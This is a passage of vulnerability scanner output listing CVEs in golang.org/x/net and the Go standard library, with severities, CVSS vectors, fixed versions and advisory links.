│     │      ├ VendorIDs        ─ [0]: GHSA-vvgc-356p-c3xw 
│     │      ├ PkgID           : golang.org/x/net@v0.37.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.37.0 
│     │      │                  ╰ UID : 5b14e468f8bbca73 
│     │      ├ InstalledVersion: v0.37.0 
│     │      ├ FixedVersion    : 0.38.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-22872 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:00ad9ae0f29af2c3644598e30ccd08b3f2a83c248692313b58535dcd7a40d011 
│     │      ├ Title           : golang.org/x/net/html: Incorrect Neutralization of Input During Web Page
│     │      │                   Generation in x/net in golang.org/x/net 
│     │      ├ Description     : The tokenizer incorrectly interprets tags with unquoted attribute values that
│     │      │                   end with a solidus character (/) as self-closing. When directly using
│     │      │                   Tokenizer, this can result in such tags incorrectly being marked as
│     │      │                   self-closing, and when using the Parse functions, this can result in content
│     │      │                   following such tags as being placed in the wrong scope during DOM
│     │      │                   construction, but only when tags are in foreign content (e.g. <math>, <svg>,
│     │      │                   etc contexts). 
│     │      ├ Severity        : MEDIUM 
│     │      ├ VendorSeverity   ╭ amazon     : 3 
│     │      │                  ├ azure      : 2 
│     │      │                  ├ cbl-mariner: 2 
│     │      │                  ├ ghsa       : 2 
│     │      │                  ├ redhat     : 2 
│     │      │                  ╰ ubuntu     : 2 
│     │      ├ CVSS             ╭ ghsa   ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:
│     │      │                  │        │            L/SA:N 
│     │      │                  │        ╰ V40Score : 5.3 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:L 
│     │      │                           ╰ V3Score : 6.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/security/cve/CVE-2025-22872 
│     │      │                  ├ [1] : https://github.com/TheDegenerateDev5150/net/commit/e1fcd82abba34df74614
│     │      │                  │       020343be8eb1fe85f0d9 
│     │      │                  ├ [2] : https://github.com/advisories/GHSA-vvgc-356p-c3xw 
│     │      │                  ├ [3] : https://go.dev/cl/662715 
│     │      │                  ├ [4] : https://go.dev/issue/73070 
│     │      │                  ├ [5] : https://groups.google.com/g/golang-announce/c/ezSKR9vqbqA 
│     │      │                  ├ [6] : https://nvd.nist.gov/vuln/detail/CVE-2025-22872 
│     │      │                  ├ [7] : https://pkg.go.dev/vuln/GO-2025-3595 
│     │      │                  ├ [8] : https://security.netapp.com/advisory/ntap-20250516-0007 
│     │      │                  ├ [9] : https://security.netapp.com/advisory/ntap-20250516-0007/ 
│     │      │                  ├ [10]: https://ubuntu.com/security/notices/USN-8089-1 
│     │      │                  ├ [11]: https://ubuntu.com/security/notices/USN-8089-2 
│     │      │                  ├ [12]: https://ubuntu.com/security/notices/USN-8089-3 
│     │      │                  ╰ [13]: https://www.cve.org/CVERecord?id=CVE-2025-22872 
│     │      ├ PublishedDate   : 2025-04-16T18:16:04.183Z 
│     │      ╰ LastModifiedDate: 2026-04-15T00:35:42.02Z 
│     ├ [6]  ╭ VulnerabilityID : CVE-2026-25679 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4601 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.8, 1.26.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-25679 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:dfcb4690b111ec7b69db146ed309b64422041dd547913f8d8ad6e70dafbb3856 
│     │      ├ Title           : net/url: Incorrect parsing of IPv6 host literals in net/url 
│     │      ├ Description     : url.Parse insufficiently validated the host/authority component and accepted
│     │      │                   some invalid URLs. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-425 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ azure      : 3 
│     │      │                  ├ bitnami    : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:9044 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-25679 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2445356 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2445356 
│     │      │                  ├ [4] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25679 
│     │      │                  ├ [5] : https://errata.almalinux.org/9/ALSA-2026-9044.html 
│     │      │                  ├ [6] : https://errata.rockylinux.org/RLSA-2026:7011 
│     │      │                  ├ [7] : https://go.dev/cl/752180 
│     │      │                  ├ [8] : https://go.dev/issue/77578 
│     │      │                  ├ [9] : https://groups.google.com/g/golang-announce/c/EdhZqrQ98hk 
│     │      │                  ├ [10]: https://linux.oracle.com/cve/CVE-2026-25679.html 
│     │      │                  ├ [11]: https://linux.oracle.com/errata/ELSA-2026-9044.html 
│     │      │                  ├ [12]: https://nvd.nist.gov/vuln/detail/CVE-2026-25679 
│     │      │                  ├ [13]: https://pkg.go.dev/vuln/GO-2026-4601 
│     │      │                  ╰ [14]: https://www.cve.org/CVERecord?id=CVE-2026-25679 
│     │      ├ PublishedDate   : 2026-03-06T22:16:00.72Z 
│     │      ╰ LastModifiedDate: 2026-04-21T14:43:03.8Z 
│     ├ [7]  ╭ VulnerabilityID : CVE-2026-32280 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4947 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32280 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:3be2a272df0690051876b8f6a93b7211d43fb2afb117e9738618105673a22658 
│     │      ├ Title           : crypto/x509: crypto/tls: golang: Go: Denial of Service vulnerability in
│     │      │                   certificate chain building 
│     │      ├ Description     : During chain building, the amount of work that is done is not correctly
│     │      │                   limited when a large number of intermediate certificates are passed in
│     │      │                   VerifyOptions.Intermediates, which can lead to a denial of service. This
│     │      │                   affects both direct users of crypto/x509 and users of crypto/tls. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-770 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ bitnami    : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:14200 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-32280 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2456336 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/2456338 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/2456339 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2456336 
│     │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2456338 
│     │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2456339 
│     │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32280 
│     │      │                  ├ [9] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32282 
│     │      │                  ├ [10]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32283 
│     │      │                  ├ [11]: https://errata.almalinux.org/9/ALSA-2026-14200.html 
│     │      │                  ├ [12]: https://errata.rockylinux.org/RLSA-2026:11514 
│     │      │                  ├ [13]: https://go.dev/cl/758320 
│     │      │                  ├ [14]: https://go.dev/issue/78282 
│     │      │                  ├ [15]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [16]: https://linux.oracle.com/cve/CVE-2026-32280.html 
│     │      │                  ├ [17]: https://linux.oracle.com/errata/ELSA-2026-14200.html 
│     │      │                  ├ [18]: https://nvd.nist.gov/vuln/detail/CVE-2026-32280 
│     │      │                  ├ [19]: https://pkg.go.dev/vuln/GO-2026-4947 
│     │      │                  ╰ [20]: https://www.cve.org/CVERecord?id=CVE-2026-32280 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.247Z 
│     │      ╰ LastModifiedDate: 2026-04-16T19:16:42.18Z 
│     ├ [8]  ╭ VulnerabilityID : CVE-2026-32281 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4946 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32281 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:617d7bc07f5199d10b56677bcc84db6fd9921f3d4a9f4db9bf02cc68cfa2db7a 
│     │      ├ Title           : crypto/x509: golang: Go crypto/x509: Denial of Service via inefficient
│     │      │                   certificate chain validation 
│     │      ├ Description     : Validating certificate chains which use policies is unexpectedly inefficient
│     │      │                   when certificates in the chain contain a very large number of policy mappings,
│     │      │                    possibly causing denial of service. This only affects validation of otherwise
│     │      │                    trusted certificate chains, issued by a root CA in the VerifyOptions.Roots
│     │      │                   CertPool, or in the system certificate pool. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-295 
│     │      ├ VendorSeverity   ╭ amazon : 3 
│     │      │                  ├ bitnami: 3 
│     │      │                  ├ nvd    : 3 
│     │      │                  ╰ redhat : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 5.9 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-32281 
│     │      │                  ├ [1]: https://go.dev/cl/758061 
│     │      │                  ├ [2]: https://go.dev/issue/78281 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-32281 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-4946 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-32281 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.35Z 
│     │      ╰ LastModifiedDate: 2026-04-16T19:15:57.75Z 
│     ├ [9]  ╭ VulnerabilityID : CVE-2026-32283 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4870 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32283 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:837f08081b4efbc79864eabdff2bb60ec38ca309abe9276dfc24c0cf7ed4e166 
│     │      ├ Title           : crypto/tls: golang: Go crypto/tls: Denial of Service via multiple TLS 1.3 key
│     │      │                   update messages 
│     │      ├ Description     : If one side of the TLS connection sends multiple key update messages
│     │      │                   post-handshake in a single record, the connection can deadlock, causing
│     │      │                   uncontrolled consumption of resources. This can lead to a denial of service.
│     │      │                   This only affects TLS 1.3. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-770 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ bitnami    : 3 
│     │      │                  ├ nvd        : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:14200 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-32283 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2456336 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/2456338 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/2456339 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2456336 
│     │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2456338 
│     │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2456339 
│     │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32280 
│     │      │                  ├ [9] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32282 
│     │      │                  ├ [10]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32283 
│     │      │                  ├ [11]: https://errata.almalinux.org/9/ALSA-2026-14200.html 
│     │      │                  ├ [12]: https://errata.rockylinux.org/RLSA-2026:11514 
│     │      │                  ├ [13]: https://go.dev/cl/763767 
│     │      │                  ├ [14]: https://go.dev/issue/78334 
│     │      │                  ├ [15]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [16]: https://linux.oracle.com/cve/CVE-2026-32283.html 
│     │      │                  ├ [17]: https://linux.oracle.com/errata/ELSA-2026-14200.html 
│     │      │                  ├ [18]: https://nvd.nist.gov/vuln/detail/CVE-2026-32283 
│     │      │                  ├ [19]: https://pkg.go.dev/vuln/GO-2026-4870 
│     │      │                  ╰ [20]: https://www.cve.org/CVERecord?id=CVE-2026-32283 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.58Z 
│     │      ╰ LastModifiedDate: 2026-04-16T19:12:10.54Z 
│     ├ [10] ╭ VulnerabilityID : CVE-2026-27142 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4603 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.8, 1.26.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27142 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:c1708867ed6f8220459c133f40269d33ea53d260db58d97668fed23992310a9f 
│     │      ├ Title           : html/template: URLs in meta content attribute actions are not escaped in
│     │      │                   html/template 
│     │      ├ Description     : Actions which insert URLs into the content attribute of HTML meta tags are not
│     │      │                    escaped. This can allow XSS if the meta tag also has an http-equiv attribute
│     │      │                   with the value "refresh". A new GODEBUG setting has been added,
│     │      │                   htmlmetacontenturlescape, which can be used to disable escaping URLs in
│     │      │                   actions in the meta content attribute which follow "url=" by setting
│     │      │                   htmlmetacontenturlescape=0. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-79 
│     │      ├ VendorSeverity   ╭ amazon : 3 
│     │      │                  ├ bitnami: 2 
│     │      │                  ╰ redhat : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N 
│     │      │                  │         ╰ V3Score : 6.1 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N 
│     │      │                            ╰ V3Score : 5.4 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-27142 
│     │      │                  ├ [1]: https://go.dev/cl/752081 
│     │      │                  ├ [2]: https://go.dev/issue/77954 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/EdhZqrQ98hk 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-27142 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-4603 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-27142 
│     │      ├ PublishedDate   : 2026-03-06T22:16:01.177Z 
│     │      ╰ LastModifiedDate: 2026-04-21T14:30:01.38Z 
│     ├ [11] ╭ VulnerabilityID : CVE-2026-32282 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4864 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32282 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:ab51177cf0942c90ac637db8e8fe0462f545578ee54f877165cd4640f8679d3a 
│     │      ├ Title           : golang: internal/syscall/unix: Root.Chmod can follow symlinks out of the root 
│     │      ├ Description     : On Linux, if the target of Root.Chmod is replaced with a symlink while the
│     │      │                   chmod operation is in progress, Chmod can operate on the target of the
│     │      │                   symlink, even when the target lies outside the root. The Linux fchmodat
│     │      │                   syscall silently ignores the AT_SYMLINK_NOFOLLOW flag, which Root.Chmod uses
│     │      │                   to avoid symlink traversal. Root.Chmod checks its target before acting and
│     │      │                   returns an error if the target is a symlink lying outside the root, so the
│     │      │                   impact is limited to cases where the target is replaced with a symlink between
│     │      │                    the check and operation. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-59 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ bitnami    : 2 
│     │      │                  ├ nvd        : 2 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 2 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H 
│     │      │                  │         ╰ V3Score : 6.4 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H 
│     │      │                  │         ╰ V3Score : 6.4 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H 
│     │      │                            ╰ V3Score : 7.8 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:14200 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-32282 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2456336 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/2456338 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/2456339 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2456336 
│     │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2456338 
│     │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2456339 
│     │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32280 
│     │      │                  ├ [9] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32282 
│     │      │                  ├ [10]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32283 
│     │      │                  ├ [11]: https://errata.almalinux.org/9/ALSA-2026-14200.html 
│     │      │                  ├ [12]: https://errata.rockylinux.org/RLSA-2026:11514 
│     │      │                  ├ [13]: https://go.dev/cl/763761 
│     │      │                  ├ [14]: https://go.dev/issue/78293 
│     │      │                  ├ [15]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [16]: https://linux.oracle.com/cve/CVE-2026-32282.html 
│     │      │                  ├ [17]: https://linux.oracle.com/errata/ELSA-2026-14200.html 
│     │      │                  ├ [18]: https://nvd.nist.gov/vuln/detail/CVE-2026-32282 
│     │      │                  ├ [19]: https://pkg.go.dev/vuln/GO-2026-4864 
│     │      │                  ╰ [20]: https://www.cve.org/CVERecord?id=CVE-2026-32282 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.467Z 
│     │      ╰ LastModifiedDate: 2026-04-16T19:15:39.4Z 
│     ├ [12] ╭ VulnerabilityID : CVE-2026-32288 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4869 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32288 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:484fcc27244d94fe3dd7bc530081f5adb341813e8cd839fa2c790aee5d0317a1 
│     │      ├ Title           : archive/tar: golang: Go's archive/tar package: Denial of Service via
│     │      │                   maliciously-crafted archive 
│     │      ├ Description     : tar.Reader can allocate an unbounded amount of memory when reading a
│     │      │                   maliciously-crafted archive containing a large number of sparse regions
│     │      │                   encoded in the "old GNU sparse map" format. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-770 
│     │      ├ VendorSeverity   ╭ amazon : 3 
│     │      │                  ├ azure  : 2 
│     │      │                  ├ bitnami: 2 
│     │      │                  ├ nvd    : 2 
│     │      │                  ├ photon : 3 
│     │      │                  ╰ redhat : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 5.5 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 5.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L 
│     │      │                            ╰ V3Score : 4.3 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-32288 
│     │      │                  ├ [1]: https://go.dev/cl/763766 
│     │      │                  ├ [2]: https://go.dev/issue/78301 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-32288 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-4869 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-32288 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.707Z 
│     │      ╰ LastModifiedDate: 2026-04-16T19:08:52.24Z 
│     ├ [13] ╭ VulnerabilityID : CVE-2026-32289 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4865 
│     │      ├ PkgID           : stdlib@v1.24.13 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.24.13 
│     │      │                  ╰ UID : ae746daa41f315ef 
│     │      ├ InstalledVersion: v1.24.13 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
